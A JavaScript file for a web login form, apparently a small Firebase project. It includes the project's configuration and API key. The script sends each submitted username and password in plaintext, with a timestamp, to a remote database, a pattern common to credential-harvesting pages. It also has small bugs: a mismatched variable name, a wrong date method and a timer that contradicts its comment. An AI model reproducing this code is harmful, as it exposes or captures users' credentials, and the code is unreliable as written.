// Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  var firebaseConfig = {
    apiKey: "AIzaSyA6XmqP76EBAG1XHZhtbJn6lDDagYH14xI",
    authDomain: "aqueous-encoder-301807.firebaseapp.com",
    databaseURL: "https://aqueous-encoder-301807-default-rtdb.firebaseio.com",
    projectId: "aqueous-encoder-301807",
    storageBucket: "aqueous-encoder-301807.appspot.com",
    messagingSenderId: "1012545270359",
    appId: "1:1012545270359:web:2f1eaf15ac45e14312e912",
    measurementId: "G-HKQ1DCN73M"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

// Reference messages collection
var loginRef = firebase.database().ref('login')


//listen for form login
document.getElementById('loginform').addEventListener('submit', submitForm);

//submit form for login
function submitForm(e){
  e.preventDefault();

//get login values
var username = getInputVal('username');
var password = getInputVal('password');
var currentdate = new Date();
var datetime = "Last Sync: " + currentdate.getDay() + "/" + currentdate.getMonth() 
+ "/" + currentdate.getFullYear() + " @ " 
+ currentdate.getHours() + ":" 
+ currentdate.getMinutes() + ":" + currentdate.getSeconds();

//save message for login
saveLogin(username, password, datetime)

// show alert
document.querySelector('.alert').style.display = 'block';

// hide alert after 5s
setTimeout(function(){
    document.querySelector('.alert').style.display = 'none';
},9000);

// clear form
document.getElementById('loginform').reset();
}

// function to get form values
function getInputVal(id){
return document.getElementById(id).value;
}

// save message to firebase
function saveLogin(username, password, datetime) {
var newLoginRef = LoginRef.push();
newLoginRef.set({
    
    Username: username,
    Password: password,
    Date: datetime,
})
}
//Notify user
function notifyMe() {
  // Let's check if the browser supports notifications
  if (!("Notification" in window)) {
    alert("This browser does not support desktop notification");
  }

  // Let's check whether notification permissions have already been granted
  else if (Notification.permission === "granted") {
    // If it's okay let's create a notification
    var notification = new Notification("Hi there!");
  }

  // Otherwise, we need to ask the user for permission
  else if (Notification.permission !== "denied") {
    Notification.requestPermission().then(function (permission) {
      // If the user accepts, let's create a notification
      if (permission === "granted") {
        var notification = new Notification("Hi there!");
      }
    });
  }

  // At last, if the user has denied notifications, and you
  // want to be respectful there is no need to bother them any more.
}